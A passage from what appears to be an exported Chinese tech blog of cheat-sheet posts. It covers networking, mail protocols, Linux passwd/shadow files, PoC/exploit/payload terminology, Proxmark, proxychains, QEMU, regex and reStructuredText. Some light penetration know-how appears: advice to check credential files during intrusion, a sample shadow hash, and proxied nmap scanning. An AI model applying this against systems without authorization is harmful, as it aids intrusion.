<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>如前所述，tracker 服务器是一个 BitTorrent 网络的重点，大部分客户端都支持自定义 tracker 列表，GitHub 上就有一些精选的 tracker 列表：</p>
<ul>
<li><a href="https://github.com/ngosang/trackerslist">https://github.com/ngosang/trackerslist</a></li>
<li><a href="https://github.com/XIU2/TrackersListCollection">https://github.com/XIU2/TrackersListCollection</a></li>
</ul>
<p>为了降低对 tracker 服务器的依赖，BitTorrent 中也使用到了前面提到的分布式散列表（DHT）。</p>
<!--
[IKnowWhatYouDownload](https://iknowwhatyoudownload.com/en/peer/)
-->
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux中/etc/passwd与/etc/shadow的区别</title>
    <url>/2018/04/29/passwd-and-shadow/</url>
    <content><![CDATA[<p>简单来说，<code>/etc/passwd</code>存储一般的用户信息，任何人都可以访问；<code>/etc/shadow</code>存储用户的密码信息，只有 root 用户可以访问。下面来详细介绍：</p>
<h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h2><p>早期的Linux中，用户的密码也存储在此文件中，但因为此文件所有人都可以访问，对密码的存储不安全，但又不能把它的权限改为仅 root 用户，因为系统的其他程序可能会用到此文件中存储的用户其他信息，所以，后来Linux将用户密码存储到了<code>/etc/shadow</code>文件中，并将其权限设为仅 root 用户。在渗透过程中，这两个文件最好都检查。<br><code>/etc/passwd</code>的文件格式为：<strong>用户名:密码:用户ID:用户组ID:注释:用户目录:登录shell</strong>，共7项，默认情况下，root的用户ID为0，1-99表示预定义用户，100-999表示其他系统帐户，新建的其他用户ID从1000起，用户组ID代表的详细信息存储在<code>/etc/group</code>文件中，如果密码被存储在了<code>/etc/shadow</code>文件中，则此文件中密码项为x，常见形式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h2><p><code>/etc/shadow</code>的文件格式为：<strong>用户名:密码:上次修改密码日期(从1970年1月1日起的天数):密码在两次修改期间的最小天数(0表示可在任何时间修改):密码需要被变更的天数(99999表示不需要变更):密码变更前提前几天警告:账号失效日期:账号失效后被禁用的天数:保留字段</strong>，共9项，如果密码项以 ! 或 *  起始，则代表此账号被锁定，不能用于登录，密码项中更为详细的格式为：<strong>$加密方法ID$Salt$加密值</strong>，常见形式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:$6$Fsf6Q6SH<span class="variable">$MlagWih0lcGFxtAo7</span>/s8Z5.wywJyCqH6qateZ6yPFOPm8bNYTGAEPygZxSOPR1A9Rtw.WxJp2fNMOoeB1wj890:17524:0:99999:7:::</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透中 PoC、Exp、Payload 与 Shellcode 的区别</title>
    <url>/2018/04/29/payload-shellcode-exp-poc/</url>
    <content><![CDATA[<p>PoC，全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。</p>
<p>Exp，全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</p>
<p>Payload，中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。</p>
<p>Shellcode，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向/反向 shell 而得名。</p>
<p>几点注意：<br>PoC 是用来证明漏洞存在的，Exp 是用来利用漏洞的，两者通常不是一类，或者说，PoC 通常是无害的，Exp 通常是有害的，有了 PoC，才有 Exp。</p>
<p>Payload 有很多种，它可以是 Shellcode，也可以直接是一段系统命令。同一个 Payload 可以用于多个漏洞，但每个漏洞都有其自己的 Exp，也就是说不存在通用的 Exp。</p>
<p>Shellcode 也有很多种，包括正向的，反向的，甚至 meterpreter。</p>
<p>Shellcode 与 Shellshcok 不是一个，Shellshock 特指 14 年发现的 Shellshock 漏洞。</p>
<a id="more"></a>
<p>另外：<br>在 Metasploit Framework 6 大模块中有一个 Payload 模块，在该模块下有 Single、Stager、Stages 这三种类型，Single 是一个 all-in-one 的 Payload，不依赖其他的文件，所以它的体积会比较大，Stager 主要用于当目标计算机的内存有限时，可以先传输一个较小的 Stager 用于建立连接，Stages 指利用 Stager 建立的连接下载后续的 Payload。Stager 和 Stages 都有多种类型，适用于不同场景。</p>
<p>尾巴：<br>想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 Exp，你在他家所做的就是不同的 Payload，就把窃听器当作 Shellcode 吧！</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>手机号与身份证号的秘密</title>
    <url>/2018/05/09/phone-number-and-id-card/</url>
    <content><![CDATA[<h2 id="手机号码"><a href="#手机号码" class="headerlink" title="手机号码"></a>手机号码</h2><p>国内手机号码为11位数，按照各部分编码的含义可以分为3段：前3位是网络识别号，用以标识一个通信运营商；第4-7位是地区编码，由HLR归属位置寄存器确定；第8-11位是用户号码，此段随机分配。</p>
<h2 id="身份证号码"><a href="#身份证号码" class="headerlink" title="身份证号码"></a>身份证号码</h2><p>国内居民身份证号码为18位数，按照各部分编码的含义可以分为4段：前6位是地址码，即编码对象常住户口所在县的行政区划代码，其中第1-2位表示省，第3-4位表示市，第5-6位表示县；第7-14位是出生日期码；第15-17位是顺序码，即在地址码所标识的区域范围内，对同年、月、日出生的人员编定的顺序号，其中第17位奇数分给男性，偶数分给女性；第18位是校验码，根据前面17位数字码，按照如下算法计算出来的：</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title>POP3、IMAP 和 SMTP</title>
    <url>/2020/12/29/pop3-imap-smtp/</url>
    <content><![CDATA[<p>因特网电子邮件系统由 3 个主要部分组成：</p>
<ul>
<li>用户代理（user agent）：允许用户阅读、回复、转发、保存和撰写报文，如微软的 Outlook 和 Apple Mail 等</li>
<li>邮件服务器（mail server）：每个接收方在其中的某个邮件服务器上有一个邮箱（mailbox）</li>
<li>SMTP</li>
</ul>
<p>一个典型的邮件发送过程是：从发送方的用户代理开始，传输到发送方的邮件服务器（通过 SMTP 或 HTTP），再传输到接收方的邮件服务器（通过 SMTP），然后在这里被分发到接收方的邮箱中。如果发送方的邮件服务器不能将邮件交付给接收方的邮件服务器，发送方的邮件服务器在一个<strong>报文队列</strong>（message queue）中保持该报文并在以后尝试再次发送。</p>
<a id="more"></a>

<h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h2><p><strong>SMTP</strong>（Simple Mail Transfer Protocol，简单邮件传输协议）是因特网电子邮件中主要的应用层协议。它使用 TCP 可靠数据传输服务，从发送方的邮件服务器向接收方的邮件服务器发送邮件。每台邮件服务器既运行 SMTP 的客户端也运行 SMTP 的服务器端。</p>
<p>SMTP 一般不使用中间邮件服务器发送邮件。</p>
<p>SMTP 是如何将一个报文从发送邮件服务器传送到接收邮件服务器的呢？首先，客户 SMTP（运行在发送邮件服务器主机上）在 <strong>25</strong> 号端口建立一个到服务器 SMTP（运行在接收邮件服务器主机上）的 TCP 连接。如果服务器没有开机，客户会在稍后继续尝试连接。一旦连接建立，服务器和客户执行某些应用层的握手。在 SMTP 握手的阶段，SMTP 客户指示发送方的邮件地址（产生报文的那个人）和接收方的邮件地址。一旦握手完成，客户发送该报文。该客户如果有另外的报文要发送到该服务器，就在该相同的 TCP 连接上重复这种处理；否则，它指示 TCP 关闭连接。以下是一个例子（S 代表 SMTP 服务器，C 代表 SMTP 客户）：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">S: 220 hamburger.edu</span><br><span class="line">C: HELO crepes.fr</span><br><span class="line">S: 250 Hello crepes.fr, pleased to meet you</span><br><span class="line">C: MAIL FROM: &lt;alice@crepes.fr&gt;</span><br><span class="line">S: 250 alice@crepes.fr ... Sender ok</span><br><span class="line">C: RCPT TO: &lt;bob@hamburger.edu&gt;</span><br><span class="line">S: 250 bob@hamburger.edu ... Recipient ok</span><br><span class="line">C: DATA</span><br><span class="line">S: 354 Enter mail, end with &quot;.&quot; on a line by itself</span><br><span class="line">C: Do you like ketchup?</span><br><span class="line">C: How about pickles?</span><br><span class="line">C: .</span><br><span class="line">S: 250 Message accepted for delivery</span><br><span class="line">C: QUIT</span><br><span class="line">S: 221 hamburger.edu closing connection</span><br></pre></td></tr></table></figure>

<p>在上例中，该客户发送了 5 条命令：<code>HELO</code>（是 HELLO 的缩写）、<code>MAIL FROM</code>、<code>RCPT TO</code>、<code>DATA</code> 以及 <code>QUIT</code>。</p>
<p>当然，你也可以使用 Telnet 直接与一个 SMTP 服务器对话，如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">telnet smtp.office365.com 25</span><br></pre></td></tr></table></figure>

<h3 id="与-HTTP-的对比"><a href="#与-HTTP-的对比" class="headerlink" title="与 HTTP 的对比"></a>与 HTTP 的对比</h3><p>SMTP 与 HTTP 有一些共同的特征：</p>
<ul>
<li>这两个协议都用于从一台主机向另一台主机传送文件</li>
<li>当进行文件传送时，持续的 HTTP 和 SMTP 都使用持续连接</li>
</ul>
<p>然而，两者之间也有一些重要的区别：</p>
<p>首先，HTTP 主要是一个<strong>拉协议</strong>（pull protocol），即在方便的时候，某些人在 Web 服务器上装载信息，用户使用 HTTP 从该服务器拉取这些信息。特别是 TCP 连接是由想接收文件的机器发起的。另一方面，SMTP 基本上是一个<strong>推协议</strong>（push protocol），即发送邮件服务器把文件推向接收邮件服务器。特别是，这个 TCP 连接是由发送该文件的机器发起的。</p>
<p>第二个区别是由于问世较早， SMTP 要求每个报文（包括它们的体）采用 7 比特 ASCII 码格式。如果某报文包含了非 7 比特 ASCII 字符（如具有重音的法文字符）或二进制数据（如图形文件），则该报文必须按照 7 比特 ASCII 码进行编码。HTTP 数据则不受这种限制。</p>
<p>第三个重要区别是如何处理一个既包含文本又包含图形（也可能是其他媒体类型）的文档。HTTP 把每个对象封装到它自己的 HTTP 响应报文中，而 SMTP 则把所有报文对象放在一个报文之中。</p>
<h3 id="邮件报文格式"><a href="#邮件报文格式" class="headerlink" title="邮件报文格式"></a>邮件报文格式</h3><p>如同 HTTP 协议，邮件报文也有相应的邮件首部行，每个首部行包含了可读的文本，是由关键词后跟冒号及其值组成的。某些关键词是必须的，另一些则是可选的。每个首部 <em>必须</em> 含有一个 <code>From:</code> 首部行和一个 <code>To:</code> 首部行；一个首部 <em>也许</em> 包含一个 <code>Subject:</code> 首部行以及其他可选的首部行。</p>
<p>一个典型的报文首部看看起来如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">From: alice@crepes.fr</span><br><span class="line">To: bob@hamburger.edu</span><br><span class="line">Subject: Searching for the meaning of life.</span><br></pre></td></tr></table></figure>

<h2 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h2><p><strong>POP3</strong>（Post Office Protocol——Version 3，第三版的邮局协议）是一个极为简单的邮件访问协议。</p>
<p>当用户代理（客户）打开了一个到邮件服务器（服务器）端口 <strong>110</strong> 上的 TCP 连接后，POP3 就开始工作了。随着建立 TCP 连接，POP3 按照 3 个阶段进行工作：</p>
<ol>
<li>特许（authorization）：用户代理发送（以明文形式）用户名和口令以鉴别用户</li>
<li>事务处理：用户代理取回报文；同时在这个阶段用户代理还能进行如下操作，对报文做删除标记，取消报文删除标记，以及获取邮件的统计信息</li>
<li>更新：它出现在客户发出了 quit 命令之后，目的是结束该 POP3 会话；这时，该邮件服务器删除那些被标记为删除的报文</li>
</ol>
<p>在 POP3 的事务处理过程中，用户代理发出一些命令，服务器对每个命令做出回答。回答可能有两种：</p>
<ul>
<li><code>+OK</code>：（有时后面还跟有服务器到客户的数据），被服务器用来指示前面的命令是正常的</li>
<li><code>-ERR</code>：被服务器用来指示前面的命令出现了某些差错</li>
</ul>
<p>特许阶段有两个主要的命令：<code>user &lt;user name&gt;</code> 和 <code>pass &lt;password&gt;</code>。你可以使用 Telnet 进行测试，如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">telnet outlook.office365.com 110</span><br><span class="line">+OK The Microsoft Exchange POP3 service is ready.</span><br><span class="line">user bob</span><br><span class="line">+OK</span><br><span class="line">pass hungry</span><br><span class="line">+OK user successfully logged on</span><br></pre></td></tr></table></figure>

<p>在特许阶段以后，用户代理仅使用 4 个命令 <code>list</code>、<code>retr</code>、<code>dele</code> 和 <code>quit</code>。</p>
<p>使用 POP3 的用户代理通常被用户配置为“<strong>下载并删除</strong>”或者“<strong>下载并保留</strong>”方式。POP3 用户代理发出的命令序列取决于用户代理程序被配置为这两种工作方式的哪一种。使用下载并删除方式，用户代理发出 <code>list</code> —— <code>retr</code> —— <code>dele</code> 命令，如下（C 代表客户，S 代表服务器）：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C: list</span><br><span class="line">S: 1 498</span><br><span class="line">S: 2 912</span><br><span class="line">S: .</span><br><span class="line">C: retr 1</span><br><span class="line">S: (blah blah ...</span><br><span class="line">S: .................</span><br><span class="line">S: ..........blah)</span><br><span class="line">S: .</span><br><span class="line">C: dele 1</span><br><span class="line">C: retr 2</span><br><span class="line">S: (blah blah ...</span><br><span class="line">S: .................</span><br><span class="line">S: ..........blah)</span><br><span class="line">S: .</span><br><span class="line">C: dele 2</span><br><span class="line">C: quit</span><br><span class="line">S: +OK POP3 server signing off</span><br></pre></td></tr></table></figure>

<p>使用下载并保留方式，用户代理下载某邮件后，该邮件仍保留在邮件服务器上。</p>
<h2 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h2><p><strong>IMAP</strong>（Internet Mail Access Protocol，因特网邮件访问协议）是一个相比 POP3 更强大的邮件访问协议。</p>
<p>相比 POP3，IMAP 协议为用户提供了创建文件夹以及将邮件从一个文件夹移动到另一个文件夹的命令；还为用户提供了在远程文件夹中查询邮件的命令，按指定条件去查询匹配的邮件；它还提供了允许用户代理获取报文某些部分的命令。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>相比于 SMTP，POP3 和 IMAP 等邮件访问协议本质上属于拉协议，在基于 Web 的电子邮件中，则可以通过 HTTP 进行邮件的收发，此时，用户代理就是普通的浏览器。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Proxmark 入坑指南</title>
    <url>/2019/12/01/proxmark/</url>
    <content><![CDATA[<p>Proxmark 是 RFID 界的瑞士军刀，请注意，其官网为 <a href="http://www.proxmark.org/">proxmark.org</a>，其他的如 <a href="https://proxmark.com/">proxmark.com</a>、<a href="https://www.proxmark3.com/">proxmark3.com</a> 等，均为第三方商业网站，目前的最新硬件版本是 Proxmark 3。</p>
<a id="more"></a>

<h2 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h2><ul>
<li>Proxmark 3：这是 Proxmark 3 的原始版本，现已过时，不建议购买，产品图如下：</li>
</ul>
<p><img src="https://proxmark.com/user/pages/03.proxmark-3-hardware/05.proxmark-3/PM3-Trans.png" alt="Proxmark 3"></p>
<ul>
<li>Proxmark 3 RDV 2：这是 Proxmark 3 的一次升级，又称为 Revision Two（修订第二版），产品图如下：</li>
</ul>
<p><img src="https://proxmark.com/user/pages/03.proxmark-3-hardware/03.proxmark-3-rdv-2/PM3-RDV2-Trans.png" alt="Proxmark 3 RDV 2"></p>
<ul>
<li>Proxmark 3 Easy：这是 Proxmark 3 RDV 2 的廉价版本，专门通过淘宝在中国销售，也是目前淘宝上主要的 Proxmark 3 版本，产品图如下：</li>
</ul>
<p><img src="https://proxmark.com/user/pages/03.proxmark-3-hardware/04.proxmark-3-easy/PM3-Easy-Trans.png" alt="Proxmark 3 Easy"></p>
<ul>
<li>Proxmark 3 EVO：这是 Proxmark 3 RDV 2 的一次进化，又称为 Evolution（进化），产品图如下：</li>
</ul>
<p><img src="https://proxmark.com/user/pages/03.proxmark-3-hardware/02.proxmark-3-evo/PM3-Evo-Trans.png" alt="Proxmark 3 EVO"></p>
<ul>
<li>Proxmark 3 RDV 4：这是 Proxmark 3 的最新升级版本，产品图如下：</li>
</ul>
<p><img src="https://proxmark.com/user/pages/03.proxmark-3-hardware/01.proxmark-3-rdv4/PM3-RDV4-Trans.png" alt="Proxmark 3 RDV 4"></p>
<h2 id="购买"><a href="#购买" class="headerlink" title="购买"></a>购买</h2><p>Proxmark 只有 2 个官方分销商：<a href="https://lab401.com/">Lab401</a> 和 <a href="https://hackerwarehouse.com/">Hacker Warehouse</a>，当然，你也可以从万能的淘宝上购买。</p>
<p>请注意，淘宝上的版本号并不规范，据我所知，淘宝上的大部分产品都是基于 Proxmark 3 Easy 的国内再次改造版，比如，它们所谓的<strong>“一体机”</strong>实际上是 Proxmark 3 Easy 和 <a href="https://github.com/iceman1001/ChameleonMini-rebooted">ChameleonMini（变色龙）</a>的合体版。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>代理链工具：proxychains</title>
    <url>/2018/10/18/proxychains/</url>
    <content><![CDATA[<p><a href="https://github.com/haad/proxychains">proxychains</a> ，顾名思义，是一种代理链工具，它可以强制任何 Linux 下的命令行应用使用其提供的代理连接到网络。Linux 中有的应用本身并不支持代理，这时便可以使用 proxychains 强制其使用代理。</p>
<a id="more"></a>
<h2 id="安装及使用"><a href="#安装及使用" class="headerlink" title="安装及使用"></a>安装及使用</h2><p>在 Ubuntu 下可以使用 <code>sudo apt install proxychains</code> 直接安装，安装完成后会在 <code>/etc</code> 文件夹下生成 <code>proxychains.conf</code> 配置文件，在这个配置文件中可以配置代理链的工作模式和代理地址等。</p>
<p>proxychains 提供了 3 种代理模式，分别是<strong>动态链</strong>（dynamic_chain）、<strong>严格链</strong>（strict_chain）、<strong>随机链</strong>（random_chain），建议选择动态链。此外，proxychains 默认设置的代理地址为 Tor 的地址，但其实最新版的 Tor 已经更改端口为 9150，用户可以根据自己的需求按照示例格式配置地址。</p>
<p>配置完成后，要使用 proxychains，只需在相应命令前加上 <code>proxychains</code> 即可，例如 <code>proxychains nmap -sS 192.168.1.1</code>，即可强制 nmap 使用 proxychains 中设置的代理进行扫描。</p>
<h2 id="与-proxychains-ng"><a href="#与-proxychains-ng" class="headerlink" title="与 proxychains-ng"></a>与 proxychains-ng</h2><p><a href="https://github.com/rofl0r/proxychains-ng">proxychains-ng</a> 是 proxychains 的升级版，其中 ng 寓意为 new generation（新一代），目前并不知晓 proxychains-ng 与 proxychains 是否为同一组织开发，但二者的配置与使用极为相似。</p>
<p>在 Ubuntu 下可以使用 <code>sudo apt install proxychains-ng</code> 直接安装，要使用 proxychains-ng，只需在相应命令前加上 <code>proxychains4</code> 即可。</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>由于 Windows 与 Linux 的设计哲学不同，Linux 偏向使用命令行，Windows 偏向使用图形界面，所以 proxychains 并未提供 Windows 版。在 Windows 下可以使用另一款代理工具 <a href="https://www.proxifier.com/">Proxifier</a> ，它可以看作是 proxychains 的图形界面版，值得注意的是，Proxifier 是收费的，但你可以免费体验 31 天。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>QEMU小记</title>
    <url>/2019/04/18/qemu/</url>
    <content><![CDATA[<p><a href="https://www.qemu.org/">QEMU</a>是Linux中使用最广的虚拟机，其便于调试的特性也适合于系统开发者。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用<code>sudo apt install qemu</code>即可在Ubuntu中安装QEMU，安装完成后直接输入<code>qemu</code>来验证是否成功安装，如果出错，可再输入<code>qemu-system-i386</code>来验证其是否成功安装，若成功，可建立如下所示的软链接，以方便日后使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/bin/qemu-system-i386 /usr/bin/qemu</span><br></pre></td></tr></table></figure>
<p>值得注意的是，QEMU的启动需要有图形界面，若未安装图形界面，则会报错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Could not initialize SDL(No available video device) - exiting</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>使用QEMU运行一个虚拟机的命令格式为<code>qemu [options] [disk_image]</code>，其中disk_image即硬盘镜像文件。其常用的参数如下：</p>
<ul>
<li><code>-hda file</code>：使用file作为硬盘0的镜像文件。</li>
<li><code>-m megs</code>：设定虚拟内存为megs M字节，默认为128M字节。</li>
<li><code>-smp n</code>：设置为有n个CPU的SMP系统。</li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派初体验</title>
    <url>/2018/12/24/raspberry-pi-experience/</url>
    <content><![CDATA[<h2 id="Raspbian"><a href="#Raspbian" class="headerlink" title="Raspbian"></a>Raspbian</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式小记</title>
    <url>/2018/11/12/regex/</url>
    <content><![CDATA[<p><strong>正则表达式</strong>，即<strong>Regular Expression</strong>，直译为<strong>描述某种规则的表达式</strong>，通常被简写为<strong>regex</strong>或<strong>RE</strong>，是指使用单个字符串来描述、匹配一系列符合某个句法规则的字符串。</p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><ul>
<li><code>?</code>：匹配前一个字符0次或1次</li>
<li><code>+</code>：匹配前一个字符1次或多次</li>
<li><code>*</code>：匹配前一个字符0次、1次或多次</li>
<li><code>|</code>：代表选择（即或集），具有最低优先级</li>
<li><code>()</code>：用来定义操作符的范围和优先级</li>
<li><code>[abc]</code>：匹配任何一个列在方括号中的字符，在这个例子中，要么匹配一个a，要么匹配一个b，要么匹配一个c</li>
<li><code>[0-9]</code>：如果在方括号中使用短划线分隔两个字符，表示所有在这两个字符范围内的都可以匹配，在这个例子中，表示匹配所有0到9的数字</li>
<li><code>^</code>：匹配行的开头，如<code>^abc</code>表示匹配以abc开始的一行</li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>reStructuredText 小记</title>
    <url>/2018/09/17/restructuredtext/</url>
    <content><![CDATA[<p><strong>reStructuredText</strong> 是一种类似于 Markdown 的轻量标记语言，其含义为“重新构建的文本”，也被简称为 <strong>reST</strong>，文件后缀名为 <code>.rst</code>，是 Python 的 Docutils 项目的一部分，目前 reST 被广泛应用于编写 Python 文档。</p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这是一级标题</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">这是二级标题</span><br><span class="line">------------</span><br><span class="line"></span><br><span class="line">这是三级标题</span><br><span class="line">************</span><br></pre></td></tr></table></figure>

<p>reST 使用这种不同的下标表示标题的大小，你可以按照自己的喜好使用不同的下标表示不同的标题，总之，一片文档中从上往下依次出现的第一种下标就表示一级标题，第二种不同于之前出现过的下标就表示二级标题，依次类推，个人喜欢用上面这种形式。</p>
<a id="more"></a>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>和 Markdown 一样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 无序列表项</span><br><span class="line">- 无序列表项</span><br><span class="line">- 无序列表项</span><br><span class="line"></span><br><span class="line">1. 有序列表项</span><br><span class="line">2. 有序列表项</span><br><span class="line">3. 有序列表项</span><br></pre></td></tr></table></figure>

<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;Howie&#39;s Blog &lt;http:&#x2F;&#x2F;howiezhao.com&gt;&#96;_</span><br></pre></td></tr></table></figure>

<h3 id="横线"><a href="#横线" class="headerlink" title="横线"></a>横线</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----</span><br></pre></td></tr></table></figure>

<p>这是一条水平区分线，用 4 个或以上的短横线表示</p>
<h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>和传统编程语言一样，reST 使用 <code>\</code> 转义特殊字符。</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>注释以两个点和一个空格开始。如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..  这是一行注释</span><br></pre></td></tr></table></figure>

<h2 id="Interpreted-Text-Roles"><a href="#Interpreted-Text-Roles" class="headerlink" title="Interpreted Text Roles"></a>Interpreted Text Roles</h2><p><strong>Interpreted Text Roles</strong>（直译为“<strong>解释文本角色</strong>”）是 reST 中非常重要的一个概念，<strong>Interpreted Text</strong>（解释文本）是指以一对 <code>`</code> 包裹起来的文本，**Role**（角色）是指 interpreted text（解释文本）的显示规则。Interpreted Text（解释文本）的语法为 <code>:role:`text`</code> 或 <code>`text`:role:</code>，功能是根据 <code>role</code>（角色）规则对 <code>text</code>（文本）进行 interprete（解释）。</p>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><p>和 Markdown 一样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*斜体*，等价于 :emphasis:&#96;斜体&#96;</span><br><span class="line">**粗体**，等价于 :strong:&#96;粗体&#96;</span><br></pre></td></tr></table></figure>

<h3 id="单行代码"><a href="#单行代码" class="headerlink" title="单行代码"></a>单行代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#96;这里是单行代码&#96;&#96;，等价于:literal:&#96;这里是单行代码&#96;</span><br></pre></td></tr></table></figure>

<p>要了解更多 reST 中内置的 roles，可参考 <a href="http://docutils.sourceforge.net/docs/ref/rst/roles.html">Docutils 官方文档</a>。</p>
<p>当然，你也可以按照自己的需求自定义 roles，具体可参考 <a href="http://docutils.sourceforge.net/docs/howto/rst-roles.html">Docutils 官方文档</a>。</p>
<h2 id="Directives"><a href="#Directives" class="headerlink" title="Directives"></a>Directives</h2><p><strong>Directives</strong>（直译为“<strong>指令</strong>”）是 reST 中另一个非常重要的概念，Directive（指令）具有如下语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+-------+-------------------------------+</span><br><span class="line">| &quot;.. &quot; | directive type &quot;::&quot; directive |</span><br><span class="line">+-------+ block                         |</span><br><span class="line">        |                               |</span><br><span class="line">        +-------------------------------+</span><br></pre></td></tr></table></figure>

<p>Directive（指令）以明确的标记开始（两个句点和一个空格），后跟 directive type（指令类型）和两个冒号，统称为“<strong>directive marker（指令标记）</strong>”。directive block（指令块）在 directive marker（指令标记）之后立即开始，并包括所有后续的缩进行。directive block（指令块）分为 arguments（参数），options（选项，即字段列表）和 content（内容，按此顺序），其中任何一个都可能出现。</p>
<h3 id="多行代码"><a href="#多行代码" class="headerlink" title="多行代码"></a>多行代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.. code:: python</span><br><span class="line"></span><br><span class="line">  def my_function():</span><br><span class="line">      print(&quot;hello&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.. image:: picture.png</span><br><span class="line">   :alt: 当图片无法显示时，则显示这里的语句。</span><br></pre></td></tr></table></figure>

<h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>要了解更多 reST 中内置的 directives，可参考 <a href="http://docutils.sourceforge.net/docs/ref/rst/directives.html">Docutils 官方文档</a>。</p>
<p>当然，你也可以按照自己的需求自定义 directives，具体可参考 <a href="http://docutils.sourceforge.net/docs/howto/rst-directives.html">Docutils 官方文档</a>。</p>
<h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><ol>
<li>在特殊字符与要书写的文字之间加上空格，否则可能无法正常显示</li>
<li>不同段之间加一空行</li>
</ol>
<h2 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h2><p>语言只是一种标准，实现该标准就需要相应的解析器，由于 reST 是 Docutils 项目的一部分，所以 reST 最初的解析器正是由 Docutils 提供的，当你使用 <code>pip install docutils</code> 命令安装 Docutils 之后，可以运行 <code>rst2html &lt;rst file&gt; &lt;html file&gt;</code> 命令，将 reST 文件转换为 HTML 文件。</p>
<p>要了解更多的命令可参考 <a href="http://docutils.sourceforge.net/docs/user/tools.html">Docutils 官方文档</a>。</p>
